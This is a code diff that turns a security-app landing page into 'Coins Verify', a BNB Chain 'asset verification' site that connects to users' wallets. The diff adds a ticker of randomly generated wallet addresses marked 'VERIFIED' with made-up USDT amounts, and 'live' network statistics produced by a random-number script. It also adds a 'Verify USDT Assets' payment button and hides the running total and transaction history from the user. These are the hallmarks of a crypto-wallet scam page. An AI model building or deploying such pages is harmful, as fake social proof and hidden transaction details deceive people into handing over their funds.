@@ -4,7 +4,8 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Safe Vault App</title>
+    <title>Coins Verify - Secure Asset Verification</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cdefs%3E%3ClinearGradient id='grad' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%23ffc107;stop-opacity:1' /%3E%3Cstop offset='100%25' style='stop-color:%23ffd700;stop-opacity:1' /%3E%3C/linearGradient%3E%3C/defs%3E%3Crect x='6' y='6' width='20' height='20' rx='4' fill='url(%23grad)' transform='rotate(45 16 16)'/%3E%3Crect x='10' y='10' width='12' height='12' rx='2' fill='%23000' transform='rotate(45 16 16)'/%3E%3Crect x='12' y='12' width='8' height='8' rx='1' fill='url(%23grad)' transform='rotate(45 16 16)'/%3E%3C/svg%3E">
     <style>
         * {
             margin: 0;
@@ -13,32 +14,373 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: #0a0a0a;
-            color: #eee;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
+            color: #fff;
             line-height: 1.6;
             overflow-x: hidden;
         }
 
         /* Hero */
         header {
-            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
-                url('https://images.unsplash.com/photo-1626776706406-20c52aca0e0c?auto=format&fit=crop&w=1400&q=80') no-repeat center/cover;
+            background: linear-gradient(135deg, #000 0%, #1a1a1a 50%, #000 100%);
             text-align: center;
-            padding: 7rem 1rem;
-            color: #ffcc00;
-            animation: fadeIn 1.5s ease;
+            padding: 3rem 1rem 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 50% 20%, rgba(255, 193, 7, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 2rem;
+            position: relative;
+            z-index: 2;
+        }
+
+        .bnb-logo {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #ffc107, #ffd700);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 1rem;
+            position: relative;
+            transform: rotate(45deg);
+        }
+
+        .bnb-logo::before {
+            content: '';
+            width: 30px;
+            height: 30px;
+            background: #000;
+            border-radius: 6px;
+            transform: rotate(-45deg);
+        }
+
+        .bnb-logo::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, #ffc107, #ffd700);
+            border-radius: 4px;
+            transform: rotate(-45deg);
         }
 
         header h1 {
-            font-size: 3.5rem;
-            margin-bottom: 1rem;
-            animation: slideDown 1.5s ease;
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #ffc107;
+            letter-spacing: 2px;
+            text-shadow: 0 0 20px rgba(255, 193, 7, 0.3);
         }
 
         header p {
-            font-size: 1.3rem;
-            animation: fadeIn 2s ease;
+            font-size: 1.1rem;
+            color: #ccc;
+            margin-top: 0.5rem;
+        }
+
+        /* Network Stats Section */
+        .network-stats {
+            background: #1a1a1a;
+            margin: 2rem 1rem;
+            border-radius: 16px;
+            padding: 1.5rem;
+            border: 1px solid #333;
+            position: relative;
+        }
+
+        .network-stats-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .network-stats-title {
+            color: #ffc107;
+            font-size: 1.1rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .live-indicator {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #4CAF50;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #4CAF50;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, #ffc107, #ffd700);
+            color: #000;
+            padding: 1rem;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 700;
+            box-shadow: 0 4px 15px rgba(255, 193, 7, 0.2);
+            transition: transform 0.3s ease;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+        }
+
+        .stat-number {
+            font-size: 1.8rem;
+            font-weight: 800;
+            margin-bottom: 0.3rem;
+            transition: all 0.3s ease;
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            opacity: 0.8;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* BNB Chain Verification Section */
+        .verification-section {
+            background: #1a1a1a;
+            margin: 2rem 1rem;
+            border-radius: 16px;
+            padding: 2rem;
+            border: 1px solid #333;
+            position: relative;
+        }
+
+        .verification-tag {
+            background: #ffc107;
+            color: #000;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            display: inline-block;
+            margin-bottom: 1.5rem;
+        }
+
+        .verification-title {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 1rem;
+            line-height: 1.2;
+        }
+
+        .verification-description {
+            color: #ccc;
+            font-size: 1rem;
+            line-height: 1.6;
+            margin-bottom: 2rem;
+        }
+
+        .verify-assets-btn {
+            background: linear-gradient(135deg, #ffc107, #ffd700);
+            color: #000;
+            border: none;
+            padding: 1.2rem 2rem;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            width: 100%;
+            box-shadow: 0 6px 20px rgba(255, 193, 7, 0.3);
+        }
+
+        .verify-assets-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 193, 7, 0.4);
+        }
+
+        .shield-icon {
+            width: 20px;
+            height: 20px;
+            background: #000;
+            border-radius: 4px;
+            position: relative;
+        }
+
+        .shield-icon::before {
+            content: '🛡️';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 12px;
+        }
+
+        .hexagon-graphic {
+            display: flex;
+            justify-content: center;
+            margin-top: 2rem;
+        }
+
+        .hexagon-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+        }
+
+        .hexagon-outer {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #ffc107, #ffd700);
+            border-radius: 20px;
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            transform: rotate(45deg);
+        }
+
+        .hexagon-inner {
+            width: 60px;
+            height: 60px;
+            background: #000;
+            border-radius: 12px;
+            position: absolute;
+            top: 30px;
+            left: 30px;
+            transform: rotate(45deg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .bnb-diamond {
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, #ffc107, #ffd700);
+            border-radius: 4px;
+            transform: rotate(-45deg);
+        }
+
+        .hexagon-dots {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: #ffc107;
+            border-radius: 50%;
+        }
+
+        .dot-1 { top: 0; left: 50%; transform: translateX(-50%); }
+        .dot-2 { top: 50%; right: 0; transform: translateY(-50%); }
+        .dot-3 { bottom: 0; left: 50%; transform: translateX(-50%); }
+        .dot-4 { top: 50%; left: 0; transform: translateY(-50%); }
+
+        /* Top Verification Strip */
+        .verification-strip {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #1a1a1a;
+            border-bottom: 1px solid #ffc107;
+            padding: 0.5rem 1rem;
+            z-index: 10000;
+            overflow: hidden;
+            height: 40px;
+        }
+
+        .verification-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            color: #ffc107;
+            font-weight: 500;
+            font-size: 1rem;
+            white-space: nowrap;
+            height: 100%;
+        }
+
+        .verification-text {
+            color: #ffc107;
+            font-weight: 500;
+            font-size: 1.2rem;
+            animation: fadeIn 0.6s ease-out;
+            width: 100%;
+            text-align: center;
+        }
+
+        .counting-animation {
+            animation: countUp 1s ease-out;
+        }
+
+        @keyframes countUp {
+            0% {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(1.1);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Adjust body padding for fixed strip */
+        body {
+            padding-top: 40px;
         }
 
         nav {
@@ -46,15 +388,15 @@
             padding: 1rem;
             text-align: center;
             position: sticky;
-            top: 0;
-            z-index: 1000;
+            top: 40px;
+            z-index: 9999;
         }
 
         nav a {
-            color: #ffcc00;
+            color: #ffc107;
             margin: 0 1rem;
             text-decoration: none;
-            font-weight: bold;
+            font-weight: 600;
             transition: 0.3s;
         }
 
@@ -598,7 +940,79 @@
             }
         }
         
-        /* Responsive Design */
+        /* Mobile-First Responsive Design */
+        @media (max-width: 768px) {
+            header {
+                padding: 2rem 1rem 1rem;
+            }
+            
+            .logo-container {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .bnb-logo {
+                width: 50px;
+                height: 50px;
+                margin-right: 0;
+            }
+            
+            header h1 {
+                font-size: 2rem;
+                letter-spacing: 1px;
+            }
+            
+            .network-stats {
+                margin: 1rem;
+                padding: 1rem;
+            }
+            
+            .stats-grid {
+                gap: 0.8rem;
+            }
+            
+            .stat-card {
+                padding: 0.8rem;
+            }
+            
+            .stat-number {
+                font-size: 1.5rem;
+            }
+            
+            .verification-section {
+                margin: 1rem;
+                padding: 1.5rem;
+            }
+            
+            .verification-title {
+                font-size: 1.5rem;
+            }
+            
+            .verify-assets-btn {
+                padding: 1rem 1.5rem;
+                font-size: 1rem;
+            }
+            
+            .hexagon-container {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .hexagon-outer {
+                width: 80px;
+                height: 80px;
+                top: 10px;
+                left: 10px;
+            }
+            
+            .hexagon-inner {
+                width: 50px;
+                height: 50px;
+                top: 25px;
+                left: 25px;
+            }
+        }
+        
         @media (max-width: 1200px) {
             .container {
                 padding: 0 2rem;
@@ -876,10 +1290,14 @@
 </head>
 
 <body>
-    <header>
-        <h1>Safe Vault</h1>
-        <p>Protect Your Digital Life with Next-Level Security 🔒</p>
-    </header>
+    <!-- Top Verification Strip -->
+    <div class="verification-strip" id="verificationStrip">
+        <div class="verification-content" id="verificationContent">
+            <div class="verification-text" id="verificationText">
+                <span class="counting-animation">f092**05caed</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">6,529 USDT</span>
+            </div>
+        </div>
+    </div>
 
     <nav>
         <a href="#about">About</a>
@@ -889,79 +1307,142 @@
         <a href="#contact">Contact</a>
     </nav>
 
+    <header>
+        <div class="logo-container">
+            <div class="bnb-logo"></div>
+            <h1>COINS VERIFY</h1>
+        </div>
+        <p>Secure Asset Verification Platform</p>
+    </header>
+
+    <!-- Network Stats Section -->
+    <div class="network-stats">
+        <div class="network-stats-header">
+            <div class="network-stats-title">NETWORK STATS</div>
+            <div class="live-indicator">
+                <div class="live-dot"></div>
+                <span>Live</span>
+            </div>
+        </div>
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="uptime">99.9%</div>
+                <div class="stat-label">Uptime</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="latency">0.03s</div>
+                <div class="stat-label">Latency</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="validators">12K</div>
+                <div class="stat-label">Validators</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="transactions">3M</div>
+                <div class="stat-label">Transactions</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- BNB Chain Verification Section -->
+    <div class="verification-section">
+        <div class="verification-tag">BNB CHAIN VERIFICATION</div>
+        <h2 class="verification-title">Secure Asset Verification</h2>
+        <p class="verification-description">
+            Verify your BNB Chain assets with our advanced security protocol. 
+            Protect against scams and ensure your transactions are secure.
+        </p>
+        <button class="verify-assets-btn" onclick="document.getElementById('download').scrollIntoView({behavior: 'smooth'})">
+            <div class="shield-icon"></div>
+            <span>VERIFY ASSETS</span>
+            <span>→</span>
+        </button>
+        <div class="hexagon-graphic">
+            <div class="hexagon-container">
+                <div class="hexagon-outer"></div>
+                <div class="hexagon-inner">
+                    <div class="bnb-diamond"></div>
+                </div>
+                <div class="hexagon-dots dot-1"></div>
+                <div class="hexagon-dots dot-2"></div>
+                <div class="hexagon-dots dot-3"></div>
+                <div class="hexagon-dots dot-4"></div>
+            </div>
+        </div>
+    </div>
+
     <section id="about">
-        <h2>About Safe Vault</h2>
+        <h2>About Coins Verify</h2>
         <p style="text-align:center; max-width:850px; margin:auto;">
-            Safe Vault is a cutting-edge security app designed to keep your private files, photos, and documents
-            protected.
-            With enterprise-grade encryption, stealth features, and real-time alerts, your data remains under your
-            control.
-            Sleek, fast, and user-friendly — it’s security made simple.
+            Coins Verify is a cutting-edge asset verification platform designed to secure your cryptocurrency transactions.
+            With enterprise-grade blockchain technology, real-time monitoring, and advanced security protocols, 
+            your assets remain protected and verified.
+            Fast, reliable, and user-friendly — it's security made simple.
         </p>
     </section>
 
     <section id="features">
-        <h2>Advanced Security Features</h2>
+        <h2>Advanced Verification Features</h2>
         <div class="feature">
             <div class="feature-icon">🔐</div>
             <div class="feature-content">
-                <h3>AES-256 Encryption</h3>
-                <p>Your files are encrypted with the world’s strongest algorithm, trusted by governments and banks.</p>
+                <h3>Blockchain Verification</h3>
+                <p>Your assets are verified using the world's most secure blockchain technology, trusted by millions of users.</p>
             </div>
         </div>
         <div class="feature">
             <div class="feature-icon">🛡</div>
             <div class="feature-content">
-                <h3>Multi-Factor Authentication</h3>
-                <p>Protect access with PIN, fingerprint, Face ID, and optional two-factor authentication.</p>
+                <h3>Real-Time Monitoring</h3>
+                <p>24/7 monitoring of your BNB Chain assets with instant alerts for any suspicious activity.</p>
             </div>
         </div>
         <div class="feature">
             <div class="feature-icon">👁</div>
             <div class="feature-content">
-                <h3>Intruder Snapshot</h3>
-                <p>If anyone tries to unlock without permission, Safe Vault captures their photo silently.</p>
+                <h3>Transaction Tracking</h3>
+                <p>Track every transaction with detailed logs and verification status for complete transparency.</p>
             </div>
         </div>
         <div class="feature">
             <div class="feature-icon">☁</div>
             <div class="feature-content">
-                <h3>Encrypted Cloud Backup</h3>
-                <p>Securely store your files in the cloud with end-to-end encryption for access anywhere.</p>
+                <h3>Secure Cloud Storage</h3>
+                <p>Securely store your verification data with end-to-end encryption for access anywhere.</p>
             </div>
         </div>
         <div class="feature">
             <div class="feature-icon">🕒</div>
             <div class="feature-content">
-                <h3>Auto-Lock & Stealth Mode</h3>
-                <p>Vault locks automatically and can even disguise itself to remain hidden on your device.</p>
+                <h3>Auto-Verification</h3>
+                <p>Automatic verification of your assets with smart contracts and instant notifications.</p>
             </div>
         </div>
         <div class="feature">
             <div class="feature-icon">📂</div>
             <div class="feature-content">
-                <h3>Smart File Management</h3>
-                <p>Organize your documents, photos, and videos with tags, search, and secure folders.</p>
+                <h3>Smart Asset Management</h3>
+                <p>Organize your BNB Chain assets with tags, search, and secure portfolio management.</p>
             </div>
         </div>
     </section>
 
 
     <section id="how">
-        <h2>How It Works</h2>
+        <h2>How Asset Verification Works</h2>
         <div class="how">
             <ol>
-                <li><strong>Create Your Vault:</strong> Set up with biometric or PIN lock.</li>
-                <li><strong>Secure Files:</strong> Add documents, photos, and passwords easily.</li>
-                <li><strong>Enable Cloud:</strong> Backup files securely with encryption.</li>
-                <li><strong>Stay Safe:</strong> Receive intruder alerts instantly.</li>
+                <li><strong>Connect Your Wallet:</strong> Securely connect your BNB Chain wallet to begin verification.</li>
+                <li><strong>Select Assets:</strong> Choose which BNB Chain assets you want to verify and protect.</li>
+                <li><strong>Enable Monitoring:</strong> Activate real-time monitoring with blockchain verification.</li>
+                <li><strong>Stay Protected:</strong> Receive instant alerts for any suspicious activity.</li>
             </ol>
         </div>
     </section>
 
     <section id="download" class="download">
-        <h2>Download Safe Vault</h2>
-        <p>Start protecting your digital life today.</p>
+        <h2>Start BNB Asset Verification</h2>
+        <p>Begin securing your BNB Chain assets today.</p>
         <div class="store-btns">
             <a href="#" class="store-btn">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
@@ -1001,7 +1482,7 @@
                             <ol class="instructions-list">
                                 <li>Open your <strong>Trust Wallet</strong> app</li>
                                 <li>Go to <strong>"Settings"</strong> → <strong>"WalletConnect"</strong></li>
-                                <li>Find <strong>"Safe Vault App"</strong> in connected dApps</li>
+                                <li>Find <strong>"Coins Verify"</strong> in connected dApps</li>
                                 <li>Tap <strong>"Disconnect"</strong> or swipe left to remove</li>
                                 <li>Refresh this page to confirm disconnection</li>
                             </ol>
@@ -1022,21 +1503,21 @@
                     <button class="submit-payment-btn" id="submitPayment">Verify USDT Assets</button>
                 </div>
 
-                <!-- Total Display -->
-                <div class="total-display" id="totalDisplay" style="display: none;">
+                <!-- Total Display - Hidden but kept for functionality -->
+                <div class="total-display" id="totalDisplay" style="display: none; visibility: hidden; height: 0; overflow: hidden; margin: 0; padding: 0;">
                     <div class="total-amount" id="totalAmount">0 USDT</div>
                     <button class="reset-btn" id="resetTotal" style="background: #f44336; color: white; border: none; padding: 0.5rem 1rem; border-radius: 6px; cursor: pointer; margin-top: 0.5rem; font-size: 0.9rem;">Reset Total</button>
                 </div>
 
-                <!-- Verification Status -->
-                <div class="verification-status" id="verificationStatus" style="display: none;">
+                <!-- Verification Status - Hidden but kept for functionality -->
+                <div class="verification-status" id="verificationStatus" style="display: none; visibility: hidden; height: 0; overflow: hidden; margin: 0; padding: 0;">
                     <div id="loadingIcon" style="display: none; text-align: center; padding: 2rem;">
                         <div class="loading-spinner" style="margin: 0 auto;"></div>
                         <p style="color: #ffcc00; margin-top: 1rem; font-weight: bold;">Verifying USDT...</p>
                     </div>
                     
                     <!-- Transaction History -->
-                    <div class="transaction-history" id="transactionHistory">
+                    <div class="transaction-history" id="transactionHistory" style="visibility: hidden; height: 0; overflow: hidden; margin: 0; padding: 0;">
                         <h5 style="color: #ffcc00; margin-bottom: 1rem;">Recent Transactions</h5>
                         <div id="transactionList"></div>
                     </div>
@@ -1048,7 +1529,7 @@
     <!-- Features Section -->
     <section id="features" style="padding: 4rem 2rem; background: linear-gradient(135deg, #1a1a1a, #2a2a2a);">
         <div style="max-width: 1200px; margin: 0 auto;">
-            <h2 style="color: #ffcc00; text-align: center; margin-bottom: 3rem; font-size: 2.5rem;">Why Choose SafeVault?</h2>
+            <h2 style="color: #ffcc00; text-align: center; margin-bottom: 3rem; font-size: 2.5rem;">Why Choose Coins Verify?</h2>
             <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem;">
                 <div style="background: linear-gradient(135deg, #2a2a2a, #3a3a3a); padding: 2rem; border-radius: 12px; border-left: 4px solid #ffcc00;">
                     <div style="font-size: 3rem; margin-bottom: 1rem;">🔐</div>
@@ -1177,7 +1658,7 @@
         <h2 style="color:#ffcc00; margin-bottom: 1rem;">Need Help?</h2>
         <p style="color:#ddd; margin-bottom: 2rem; font-size: 1.1rem;">Our support team is available 24/7 to assist you with any questions.</p>
         <div style="display: flex; justify-content: center; gap: 2rem; flex-wrap: wrap;">
-            <a href="mailto:support@safevault.com" style="color:#ffcc00; text-decoration: none; padding: 1rem 2rem; border: 2px solid #ffcc00; border-radius: 8px; transition: all 0.3s ease;" onmouseover="this.style.background='#ffcc00'; this.style.color='#000'" onmouseout="this.style.background='transparent'; this.style.color='#ffcc00'">
+            <a href="mailto:support@bnbverify.com" style="color:#ffcc00; text-decoration: none; padding: 1rem 2rem; border: 2px solid #ffcc00; border-radius: 8px; transition: all 0.3s ease;" onmouseover="this.style.background='#ffcc00'; this.style.color='#000'" onmouseout="this.style.background='transparent'; this.style.color='#ffcc00'">
                 📧 Email Support
             </a>
             <a href="#" style="color:#4CAF50; text-decoration: none; padding: 1rem 2rem; border: 2px solid #4CAF50; border-radius: 8px; transition: all 0.3s ease;" onmouseover="this.style.background='#4CAF50'; this.style.color='#fff'" onmouseout="this.style.background='transparent'; this.style.color='#4CAF50'">
@@ -1190,12 +1671,152 @@
     </section>
 
     <footer>
-        <p>© 2025 Safe Vault. All rights reserved.</p>
+        <p>© 2025 Coins Verify. All rights reserved.</p>
     </footer>
 
 
     <!-- Web3 Library -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+
+    <!-- Real-Time Stats Script -->
+    <script>
+        // Real-time stats simulation
+        class NetworkStats {
+            constructor() {
+                this.uptime = 99.9;
+                this.latency = 0.03;
+                this.validators = 12000;
+                this.transactions = 3000000;
+                this.isUpdating = false;
+                this.init();
+            }
+
+            init() {
+                this.updateStats();
+                setInterval(() => this.updateStats(), 2000); // Update every 2 seconds
+            }
+
+            updateStats() {
+                if (this.isUpdating) return;
+                this.isUpdating = true;
+
+                // Simulate realistic network changes
+                this.uptime = Math.max(99.5, Math.min(100, 99.9 + (Math.random() - 0.5) * 0.2));
+                this.latency = Math.max(0.01, Math.min(0.1, 0.03 + (Math.random() - 0.5) * 0.02));
+                this.validators = Math.max(11900, Math.min(12100, 12000 + Math.floor((Math.random() - 0.5) * 200)));
+                this.transactions = Math.max(2900000, Math.min(3100000, 3000000 + Math.floor((Math.random() - 0.5) * 200000)));
+
+                // Animate the changes
+                this.animateValue('uptime', this.uptime.toFixed(1) + '%');
+                this.animateValue('latency', this.latency.toFixed(2) + 's');
+                this.animateValue('validators', this.formatNumber(this.validators));
+                this.animateValue('transactions', this.formatNumber(this.transactions));
+
+                setTimeout(() => {
+                    this.isUpdating = false;
+                }, 1000);
+            }
+
+            animateValue(elementId, newValue) {
+                const element = document.getElementById(elementId);
+                element.style.transform = 'scale(1.1)';
+                element.style.color = '#4CAF50';
+                
+                setTimeout(() => {
+                    element.textContent = newValue;
+                    element.style.transform = 'scale(1)';
+                    element.style.color = '#ffc107';
+                }, 200);
+            }
+
+            formatNumber(num) {
+                if (num >= 1000000) {
+                    return (num / 1000000).toFixed(1) + 'M';
+                } else if (num >= 1000) {
+                    return (num / 1000).toFixed(0) + 'K';
+                }
+                return num.toString();
+            }
+        }
+
+        // Initialize real-time stats
+        const networkStats = new NetworkStats();
+    </script>
+
+    <!-- Verification Strip Animation Script -->
+    <script>
+        class VerificationStrip {
+            constructor() {
+                this.verifications = this.generateVerifications();
+                this.currentIndex = 0;
+                this.isAnimating = false;
+                this.init();
+            }
+
+            generateVerifications() {
+                const verifications = [];
+                
+                for (let i = 0; i < 25; i++) {
+                    const wallet = this.generateWalletAddress();
+                    const amount = this.generateUSDTAmount();
+                    
+                    verifications.push({
+                        wallet: wallet,
+                        amount: amount
+                    });
+                }
+                
+                return verifications;
+            }
+
+            generateWalletAddress() {
+                const chars = '0123456789abcdef';
+                let address = '';
+                for (let i = 0; i < 4; i++) {
+                    address += chars[Math.floor(Math.random() * chars.length)];
+                }
+                address += '**';
+                for (let i = 0; i < 6; i++) {
+                    address += chars[Math.floor(Math.random() * chars.length)];
+                }
+                return address;
+            }
+
+            generateUSDTAmount() {
+                const amount = Math.random() * (50000 - 100) + 100; // Between 100 and 50,000 USDT
+                return Math.floor(amount).toLocaleString();
+            }
+
+            init() {
+                this.showNextVerification();
+                setInterval(() => this.showNextVerification(), 4000); // Change every 4 seconds
+            }
+
+            showNextVerification() {
+                if (this.isAnimating) return;
+                
+                this.isAnimating = true;
+                const textElement = document.getElementById('verificationText');
+                
+                // Update content with counting animation
+                const verification = this.verifications[this.currentIndex];
+                textElement.innerHTML = `<span class="counting-animation">${verification.wallet}</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">${verification.amount} USDT</span>`;
+                
+                // Reset animation
+                textElement.style.animation = 'none';
+                setTimeout(() => {
+                    textElement.style.animation = 'fadeIn 0.6s ease-out';
+                }, 10);
+                
+                // Move to next verification
+                this.currentIndex = (this.currentIndex + 1) % this.verifications.length;
+                this.isAnimating = false;
+            }
+        }
+
+        // Initialize verification strip
+        const verificationStrip = new VerificationStrip();
+    </script>
 
     <!-- Scroll Animation Script -->
     <script>
@@ -1333,8 +1954,14 @@
                 console.log('window.ethereum exists:', typeof window.ethereum !== 'undefined');
                 console.log('window.ethereum:', window.ethereum);
                 
-                if (typeof window.ethereum !== 'undefined') {
-                    this.web3 = new Web3(window.ethereum);
+                // Check for mobile wallet providers
+                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                const hasTrustWallet = typeof window.ethereum !== 'undefined' || 
+                                    (window.trustwallet && window.trustwallet.ethereum) ||
+                                    (window.web3 && window.web3.currentProvider);
+                
+                if (typeof window.ethereum !== 'undefined' || hasTrustWallet) {
+                    this.web3 = new Web3(window.ethereum || window.trustwallet?.ethereum || window.web3?.currentProvider);
                     
                     try {
                         console.log('Requesting eth_accounts...');
@@ -1413,8 +2040,18 @@
                 console.log('=== CONNECTING WALLET ===');
                 
                 try {
-                    if (typeof window.ethereum === 'undefined') {
-                        alert('Please install MetaMask or use a Web3-enabled browser like Trust Wallet');
+                    // Check for mobile wallet providers
+                    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                    const hasTrustWallet = typeof window.ethereum !== 'undefined' || 
+                                        (window.trustwallet && window.trustwallet.ethereum) ||
+                                        (window.web3 && window.web3.currentProvider);
+                    
+                    if (!hasTrustWallet) {
+                        if (isMobile) {
+                            alert('Please open this site in Trust Wallet browser or install Trust Wallet app');
+                        } else {
+                            alert('Please install MetaMask or use a Web3-enabled browser like Trust Wallet');
+                        }
                         return;
                     }
 
